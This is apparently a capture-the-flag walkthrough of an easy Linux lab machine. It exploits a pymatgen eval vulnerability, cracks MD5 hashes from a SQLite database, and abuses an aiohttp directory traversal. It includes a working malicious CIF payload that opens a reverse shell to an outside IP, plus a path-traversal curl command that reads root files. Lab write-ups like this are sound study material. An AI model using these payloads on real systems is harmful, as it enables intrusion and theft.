# Chemistry

**Difficulty:** Easy | **OS:** Linux | **IP:** `10.129.231.170`

## Summary
**Chemistry** is an easy-difficulty Linux machine involving a web application designed to render Crystallographic Information Files (`.cif`). Initial access is achieved by exploiting a Remote Code Execution vulnerability in the `pymatgen` Python library (CVE-2024-23346) via unsafe eval() execution during file parsing. Lateral movement to user `rosa` is accomplished by recovering an SQLite database (`database.db`) containing MD5 password hashes and cracking them. Privilege escalation to `root` is achieved by discovering an internal `aiohttp` web server vulnerable to Directory Traversal (CVE-2024-23334), allowing arbitrary file reads to retrieve the root flag.

## Reconnaissance

### Port Scanning (Nmap)

We begin by enumerating open TCP ports and identifying active service versions:

- **22**: SSH (OpenSSH 8.2p1)
- **5000** HTTP (Werkzeug httpd 3.0.3 / Python 3.9.5)

### Web Application Analysis

Navigating to [http://10.129.231.170:5000/](http://10.129.231.170:5000/) reveals a Python/Werkzeug web application allowing user registration and login. Once authenticated, users can upload and view CIF files.

Research into CIF file processing libraries in Python highlights **CVE-2024-23346**, a critical vulnerability in `pymatgen` where the `from_transformation_str()` method unsafely evaluates strings using `eval()`.

## Exploitation (User Flag)

### Exploiting CVE-2024-23346 (pymatgen RCE)

1) We register an account and log into the application.
2) We craft a malicious `.cif` payload incorporating a Python command execution vector inside the `_space_group_magn.transform_BNS_Pp_abc` parameter:

```
_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ (*[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.15.97/443 0>&1\'");0,0,0'
_space_group_magn.number_BNS 62.448
_space_group_magn.name_BNS "P n' m a' "
```

Uploading and rendering this file triggers the code execution vector, connecting back to our Netcat listener on port 443. We gain initial shell access as the `app` user.

## Pivoting / Lateral Movement

### Database Inspection & Credential Extraction

Searching for local configuration and application files:

```find . -name database.db 2>/dev/null```

We locate an SQLite database at `./instance/database.db`. Opening the database with `sqlite3` and dumping the `user` table yields registered accounts and MD5 password hashes:

```
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
...
```

### Hash Cracking & SSH Login

Cracking the MD5 hash for user `rosa` (`63ed86ee9f624c7b14f1d4f43dc251a5`) reveals the cleartext password:

Recovered Credentials: `rosa` : `unicorniosrosados`

```ssh rosa@10.129.231.170```

## Privilege Escalation (Root Flag)

### Internal Service Enumeration

Checking local network bindings reveals an internal service running on port 8080:

```ss -nltp```

Inspecting the service banner using curl:

```curl -I http://localhost:8080```

Server Header: `Python/3.9 aiohttp/3.9.1`

### Exploiting aiohttp Directory Traversal (CVE-2024-23334)

Versions of `aiohttp` prior to 3.9.2 contain a Directory Traversal flaw when serving static files with `follow_symlinks=True`.

Using `curl` with `--path-as-is` to prevent path normalization, we traverse directories from the `/assets/` endpoint to read sensitive files with root context:

```curl -s -X GET "http://localhost:8080/assets/../../../../../../../../../../../root/root.txt" --path-as-is```

This successfully executes the arbitrary file read and displays the `root.txt` flag.

## Conclusions & Key Lessons

- **Unsafe Dynamic Code Execution:** File parsing modules must never pass untrusted user input directly to dynamic evaluation functions like eval().
- **Insecure Credential Storage:** Storing user passwords using weak, unsalted hashing algorithms (e.g., MD5) allows rapid offline cracking once databases are compromised.
- **Internal Dependency Management:** Internal local services must be updated regularly; outdated software running on localhost (aiohttp 3.9.1) still poses significant privilege escalation risks.
